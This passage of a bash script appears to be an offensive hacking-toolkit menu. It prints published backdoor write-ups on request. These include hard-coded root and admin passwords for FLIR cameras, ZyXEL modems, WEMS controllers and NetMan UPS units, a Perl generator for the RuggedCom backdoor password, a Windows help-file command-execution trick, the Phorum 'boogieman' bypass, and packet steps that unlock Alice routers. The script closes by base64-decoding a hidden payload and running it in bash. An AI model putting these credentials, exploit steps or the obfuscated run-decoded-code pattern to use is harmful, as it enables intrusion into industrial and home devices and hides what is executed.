$green[2]$white ID=18779
$green[3]$white ID=50341
$green[4]$white ID=20588
$green[5]$white ID=37770
$green[6]$white ID=6750
$green[7]$white ID=30792
$green[8]$white ID=43105"
read -p "Enter ID : " id
if [ $id = 1 ]; then
echo -e "$white 
FLIR Systems FLIR Thermal Camera F/FC/PT/D Hard-Coded SSH Credentials


Vendor: FLIR Systems, Inc.
Product web page: http://www.flir.com
Affected version: Firmware version: 8.0.0.64
                  Software version: 10.0.2.43
                  Release: 1.4.1, 1.4, 1.3.4 GA, 1.3.3 GA and 1.3.2
                  FC-Series S (FC-334-NTSC)
                  FC-Series ID
                  FC-Series-R
                  PT-Series (PT-334 200562)
                  D-Series
                  F-Series

Summary: FLIR's PT-Series of high-performance, multi-sensor pan/tilt cameras
bring thermal and visible-light imaging together in a system that gives you
video and control over both IP and analog networks. The PT-Series' precision
pan/tilt mechanism gives you accurate pointing control while providing fully
programmable scan patterns, radar slew-to-cue, and slew-to-alarm functions.
PT-Series cameras define a new standard of performance with five models that
provide full 640x480 thermal resolution.

Desc: FLIR utilizes hard-coded credentials within its Linux distribution image.
These sets of credentials are never exposed to the end-user and cannot be changed
through any normal operation of the camera.

Tested on: Linux 2.6.18_pro500-davinci_evm-arm_v5t_le
           Linux 2.6.10_mvl401-davinci_evm-PSP_01_30_00_082
           Nexus Server/2.5.29.0
           Nexus Server/2.5.14.0
           Nexus Server/2.5.13.0
           lighttpd/1.4.28
           PHP/5.4.7


Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
                            @zeroscience


Advisory ID: ZSL-2017-5436
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5436.php


23.03.2017

--


root:indigo
root:video
default:video
default:[blank]
ftp:video"
back
elif [ $id = 2 ];then
echo '
Title: Undocumented Backdoor Access to RuggedCom Devices
Author: jc
Organization: JC CREW
Date: April 23, 2012
CVE: CVE-2012-1803

Background:
RuggedCom is one of a handful of networking vendors who capitalize on
the market for "Industrial Strength" and "Hardened" networking
equipment. Youll find their gear installed in traffic control
systems, railroad communications systems, power plants, electrical
substations, and even US military sites. Beyond simple L2 and L3
networking these devices are also used for serial-to-ip converstion in
SCADA systems and they even support modbus and dnp3. RuggedCom
published a handy guide to some of their larger customers at
www.ruggedcom.com/about/customers/. My favorite quote is from a
contractor who installed RuggedCom equipment at a US Air Force base:
"Reliability was not an option." How unfortunately apropos.

Problem:
An undocumented backdoor account exists within all released versions
of RuggedComs Rugged Operating System (ROS®). The username for the
account, which cannot be disabled, is "factory" and its password is
dynamically generated based on the devices MAC address. Multiple
attempts have been made in the past 12 months to have this backdoor
removed and customers notified.

Exploit:
#!/usr/bin/perl
if (! defined $ARGV[0]) 
print "+========================================== \n";
print "+ RuggedCom ROS Backdoor Password Generator \n";
print "+ JC CREW April 23 2012 \n";
print "+ Usage:\n$0 macaddress \n";
print "+========================================== \n";
exit; }
$a = $ARGV[0];
$a =~ s/[^A-F0-9]+//simg;
@b = reverse split /(\S{2})/,$a;
$c = join "", @b;
$c .= "0000";
$d = hex($c) % 999999929;
print "$d\n";

Example usage:
Given a RuggedCom device with MAC address 00-0A-DC-00-00-00, run some
perl and learn that the password for "factory" is 60644375.

[jc (at) pig (dot) aids [email concealed] ros]$ ./ruggedfail.pl 00-0A-DC-00-00-00
60644375
[jc (at) pig (dot) aids [email concealed] ros]$

Shoutouts:
CERT/CC for doing great work in trying to get vendors to actually fix things.
JC CREW

Timeline:
Apr 2011 - Vendor notified directly
Jul 2011 - Vendor verbally acknowledges knowledge of backdoor,
and ceases communication.
Feb 11 2012 - US-CERT notified
Mar 12 2012 - Vendor responds to US-CERT.
Apr 06 2012 - Due to lack of further contact by vendor, CERT sets
public disclosure for April 13 2012
Apr 10 2012 - Vendor states they need another three weeks to alert
their customers, but not fix the vulnerability.
Apr 11 2012 - Clarification requested regarding need for additional three weeks.
Apr 23 2012 - No response from vendor.
Apr 23 2012 - This disclosure.

Keywords:
RuggedCom
ROS
RuggedSwitch
RuggedServer
backdoor' 
back
elif [ $id = 3 ]; then
echo -e "$white
Exploit Title: ZyXEL PK5001Z Modem - CenturyLink Hardcoded admin and root Telnet Password.
Google Dork: n/a
Date: 2017-10-31
Exploit Author: Matthew Sheimo
Vendor Homepage: https://www.zyxel.com/
Software Link: n/a
Version: PK5001Z 2.6.20.19
Tested on: Linux
About: ZyXEL PK5001Z Modem is used by Century Link a global communications and IT services company focused on connecting its customers to the power of the digital world.
Linked CVE's: CVE-2016-10401


Hardcoded password for ZyXEL PK5001Z Modem, login with the following credentials via Telnet

username: admin
password: CenturyL1nk

Escalate to root with 'su' and this password.

password: zyad5001


[root:/]# telnet 192.168.0.1
Trying 192.168.0.1...
Connected to 192.168.0.1.
Escape character is '^]'.

PK5001Z login: admin
Password: CenturyL1nk
$ whoami
admin_404A03Tel
$ su
Password: zyad5001
whoami
root
uname -a
Linux PK5001Z 2.6.20.19 54 Wed Oct 14 11:17:48 CST 2015 mips unknown
cat /etc/zyfwinfo "
back
elif [ $id = 4 ]; then
echo "
WEMS BEMS 21.3.1 Undocumented Backdoor Account


Vendor: WEMS Limited
Product web page: https://www.wems.co.uk
Affected version: Web: 21.3.1
                  Web: 20.0beta
                  Web: 19.5
                  Web: 18.4
                  Firmware: 1.26.6 (OS: 5.3)
                  Firmware: 1.23.7 (OS: 5.0)
                  Firmware: 1.21.4 (OS: 4.1a-usb)
                  Firmware: 1.18.0.3 (OS: i686-1.1)
Platform: Shockwave Flash (SWF) / CGI

Summary: We (WEMS) offer the world's first fully wireless energy management system.
Our solution enables your organization to take control of its energy costs, by monitoring
lighting, heating and air conditioning equipment to identify wastage across multiple
sites and start saving money instantly. Additionally, we offer a service which enables
you to personally control the settings of your building - remotely, via text messaging
and the internet - from wherever you happen to be in the world.

Desc: The wireless BMS solution has an undocumented backdoor account that is Base64-encoded.
These sets of credentials are never exposed to the end-user and cannot be changed through
any normal operation of the controller thru the RMI. Attacker could exploit this vulnerability
by logging in using the backdoor account with highest privileges for administration and gain
full system control. The check_users.sh Bash script is used to generate the default accounts
on the system with their passwords and privilege level. The backdoor user cannot be seen in
the users settings in the admin panel and it also uses an undocumented privilege level 3 when
using the addhttpuser program which allows full availability of the features that the WEMS
is offering remotely. WEMS also ships with hard-coded and weak credentials for Telnet/FTP                                                                         access using the credentials gast:glasshou or root:glasshou.

Tested on: Linux 2.6.16 armv5tejl
           thttpd/2.25b
           Adam 7000 System
           WEMS OS 5.3


Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
                            @zeroscience


Advisory ID: ZSL-2019-5552
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5552.php


06.07.2019

--


Excerpt content of check_users.sh bash script:
----------------------------------------------
Default and hard-coded credentials:
-----------------------------------

WEMS:

 [Level 2/Admin - Web/SWF->CGI]     : wems:kup5EF4s
 [Level 1/User - Web/SWF->CGI]      : wemsuser:user
 [Level 0/View - Web/SWF->CGI]      : wemsview:view
 [Level 3/Backdoor - Web/SWF->CGI]  : YWRhbWNvbGxlY3Q:YzAxMTNjdGFkYW0K (adamcollect:c0113ctadam)

V.A.R. (Value Added Reseller):

 [Level 2/Admin - Web/SWF->CGI]     : var:88fRK66Q
 [Level 1/User - Web/SWF->CGI]      : varuser:user
 [Level 0/View - Web/SWF->CGI]      : varview:view

Shell:

 [Level 500/User - Telnet/FTP]      : gast:glasshou
 [Level 0/root - Telnet/FTP]        : root:glasshou
-----------------------------------


By calling the auth command through the cmd parameter, the cgiauth binary
reads the /mnt/etc/httpusers file and checks validation for authentication.
To login with the backdoor account the following HTTP GET request is made:
--------------------------------------------------------------------------

GET /cgi-bin/cgiauth?user=YWRhbWNvbGxlY3Q&pass=YzAxMTNjdGFkYW0K&cmd=auth HTTP/1.1
Host: 192.168.1.17
User-Agent: Noproblem/25.1
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://192.168.1.17/SMARThome1.swf

Response observed:

HTTP/1.1 200 OK
content-type: text/html
Transfer-Encoding: chunked
Date: Fri, 13 Sep 2019 18:15:17 GMT
Server: WEMS OS 5.0 Casino

sessionid=EQhaZPEXgJQhkXeZ&level=3&username=YWRhbWNvbGxlY3Q


--------------------------------------------------------------------------


Running addhttpuser, reading httpusers file:
--------------------------------------------

# /mnt/bin/addhttpuser
Usage is -u <username> -p <password> -l <level>
# cat /mnt/etc/httpusers
0:wems:$1$3EVBJ96F$RBX7xggVT8.zXM9vDbGWB/:2
1:wemsuser:$1$3EVBJA6F$Gr6zU7L0n4OPq7YdCM5.b1:1
2:wemsview:$1$3EVBJB6F$6XtYBc2VaQYucRe2T7lfa.:0
3:YWRhbWNvbGxlY3Q:$1$3EVBJD6F$scO5furQud3eKLHpNyUyo.:3
# ls -al /mnt/bin/addhttpuser
-rwxr-xr-x    1 root     root        16520 Jan 29  2014 /mnt/bin/addhttpuser
--------------------------------------------
telnet 192.168.1.17
Connected to 192.168.1.17.
Escape character is '^]'.

- Adam 7000 System - Version 4.1a-usb -

WEMS login: gast
Password:


BusyBox v1.01 (2011.02.24-11:55+0000) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

$ id
uid=500(gast) gid=500
$ su
Password:


BusyBox v1.01 (2011.02.24-11:55+0000) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

# id
uid=0(root) gid=0(root)
# netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN
-----------


$ ftp 192.168.1.17
WEMS FTP server (Version wu-2.6.2(12) Thu Feb 24 14:48:47 GMT 2011) ready.
user root
331 Password required for root.
pass glasshou
230 User root logged in." 
back
elif [ $id = 5 ]; then
echo "
NetMan 204 - Backdoor Account

Author: Saeed reza Zamanian [penetrationtest @ Linkedin]

Product: NetMan 204
Vendor: http://www.riello-ups.com
Product URL: http://www.riello-ups.com/products/4-software-connectivity/85-netman-204
Quick Reference Installation Manual : http://www.riello-ups.com/uploads/file/325/1325/0MNACCSA4ENQB__MAN_ACC_NETMAN_204_QST_EN_.pdf

Date: 23 Sep 2016

About Product:
----------------------
The NetMan 204 network agent allows UPS directly connected over LAN 10/100 Mb connections to be managed using the main network communication protocols (TCP /IP , HTTP HTTPS, SSH, SNMPv1, SNMPv2 and SNMPv3).
It is the ideal solution for the integration of UPS over Ethernet networks with Modbus/TCP and BACnet/IP protocols. It was developed to integrate UPS into medium-sized and large networks,
to provide a high level of reliability in communication between the UPS and associated management systems.

Vulnerability Report:
----------------------
The UPS Module has 3 default accounts, (admin,fwupgrade,user) , fwupgrade has a shell access to the device BUT if you try to get access to the shell a shell script closes your conection.
to stop the shell script and avoid to terminate your connection you should , set your SSH client to execute /bin/bash after you logon the SSH. as a result your shell type will be changed to /bin/bash
as you see below there is an account called eurek and ofcourse it's password also is eurek.
Since that eurek is a sudoer user you will get full access to the device.

Enjoy It!


login as: eurek
eurek@172.19.16.33's password:
Could not chdir to home directory /home/eurek: No such file or directory
eurek@UPS:/$ id
uid=1000(eurek) gid=1000(eurek) groups=1000(eurek),27(sudo)
eurek@UPS:/$ sudo bash
[sudo] password for eurek:
root@UPS:/# id
uid=0(root) gid=0(root) groups=0(root)
root@UPS:/#



login as: fwupgrade
fwupgrade@172.19.16.33's password:
fwupgrade@UPS:/home/fwupgrade$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
messagebus:x:102:104::/var/run/dbus:/bin/false
eurek:x:1000:1000:eurek,,,:/home/eurek:/bin/bash
postfix:x:103:106::/var/spool/postfix:/bin/false
statd:x:104:65534::/var/lib/nfs:/bin/false
pulse:x:105:110:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:106:112:RealtimeKit,,,:/proc:/bin/false
admin:x:1001:1001:,,,:/home/./admin:/bin/bash
fwupgrade:x:1002:1002:,,,:/home/./fwupgrade:/bin/bash
user:x:1003:1003:,,,:/home/user:/bin/bash
ftp:x:107:113:ftp daemon,,,:/srv/ftp:/bin/false
fwupgrade@UPS:/home/fwupgrade$"
back
elif [ $id = 6 ]; then
echo '
The help files for the Windows Help system (*.cnt, *.hlp) can be edited so that they run an arbitrary executable when selected by a user. The executable will run at the privelege level of the user.

The *.cnt files are like tables of contents that tell the help system what to open when each topic is selected. These entries can be edited to cause system and DLL calls and programs to be executed when a topic is chosen. The help files themselves, *.hlp, can be edited in a similar manner.


- Delete C:\Program Files\Microsoft Office\Office\WDMAIN8.GID
(kill winhlp32.exe process if necessary)

- Edit C:\Program Files\Microsoft Office\Office\WDMAIN8.CNT
which is a text file. You should change the line which has
something like:

3 Word 97 new features=woidxWhatsNewInMicrosoftWord97@wdnew8.hlp>REF

to read:

3 Word 97 new features=!EF("CMD.EXE","",1)

- Run WinWord and select Help|Contents from menubar.
- Find topic "Word 97 new features" and select it.
- You should see CMD.EXE to run.'
back
elif [ $id = 7 ]; then
echo "
Phorum is a freely available, open source, popular WWW Board written by Brian Moon. It is designed to enhance the services offered on a web page, allow users to interact with one another through bulletin board chat and discussion.

A problem with the package allows users access to any resources within the bulletin board system. Any file that is access controlled by the auth.php3 script may be accessed, due to a backdoor password written into the script auth.php3. The password "boogieman" will permit users to access files controlled by auth.php3 by simply appending the variable PHP_AUTH_USER=boogieman to the URL. This makes it possible for users with malicious intentions to access any file under the access control of auth.php3, and potentially gain elevated privileges, including access to the local system.
                                                                                 This vulnerability can be exploited by appending the PHP_USER_AUTH variable to the URL with the password "boogieman" as the value.

http://some.host.com/admin.php3                                                  
This file would not be accessible by the unauthenticated user. However,

http://some.host.com/admin.php3?PHP_AUTH_USER=boogieman                          
will permit access to this file."
elif [ $id = 8 ]; then
echo "
===============
1) Introduction
===============

Telecom Italia is the most important Italian ISP offering an ADSL
service named Alice.
Telecom Italia rent out with Alice Adsl service, different CPE
Modem/Router among which                                                         
the affected ones.
The interface to configure these modems are made extremily poor by the
provider to ensure
more control.
There's no way to enable telnet, ftp, tftp or more advanced web pages
from the web interface.

http://www.telecomitalia.com/
http://adsl.alice.it/

#############################################################################################

================
2) Vulnerability
================

An attacker can activate and get unauthorized access to the routers
administration
interface and telnet/ftp/tftp services from internal network.

Every user in the LAN (or Wireless LAN) can nevertheless have access
to the routers
administration interface and telnet/ftp/tftp!

If an attacker can get access to the administrator interface and
login, he has full control
over the routers configuration.

#############################################################################################


==============
3) The Exploit
==============

To enable telnet/ftp/tftp and web-admin interface it is necessary send a special
IP packet to router specific ip 192.168.1.1.
This works only from internal LAN where an attacker have and ip like
192.168.1.XX.
The ip packet send to router must have the following feature:

1)IP-protocol-number 255 (there's a RAW SOCKET listening on the router)
2)Payload size 8 byte
3)The payload are the first 8 byte of a salted md5 of the mac address
of device br0
4)br0 in these modems has the same mac of eth0

When the modem receives the packet all services will be enabled.


Example:


>From a GNU/LINUX distrib:

1)Retrieve br0 maccaddress:

arping -I eth0 -c 2 192.168.1.1

ARPING 192.168.1.1 from 192.168.1.2 eth0
Unicast reply from 192.168.1.1 [00:01:02:03:04:05]  8.419ms
Unicast reply from 192.168.1.1 [00:01:02:03:04:05]  2.095ms
Sent 2 probes (1 broadcast(s))
Received 2 response(s)


2)Calculate special md5 hash from br0 macaddress: create an hex 6 byte
long file with the mac address.
      run the application below and copy the output hash.
      http://rapidshare.com/files/153439269/AliceBDhashCreator.zip.html

3)Send ip packet to router ip 192.168.1.1 with 8 byte paylod file                (with the tool you like)

      i.e.: nemesis ip -D 192.168.1.1 -p 255 -P hash.hex                         
                                                                                 4)Telnet to router :
                                                                                       telnet 192.168.1.1
                                                                                       BCM96348 ADSL Router
      Login: admin                                                                     Password:"
back
fi
else
echo -e "$red[+]$green $exit Command Not Found "
back
fi
"
bash <( base64 -d <<< "$ENC" )
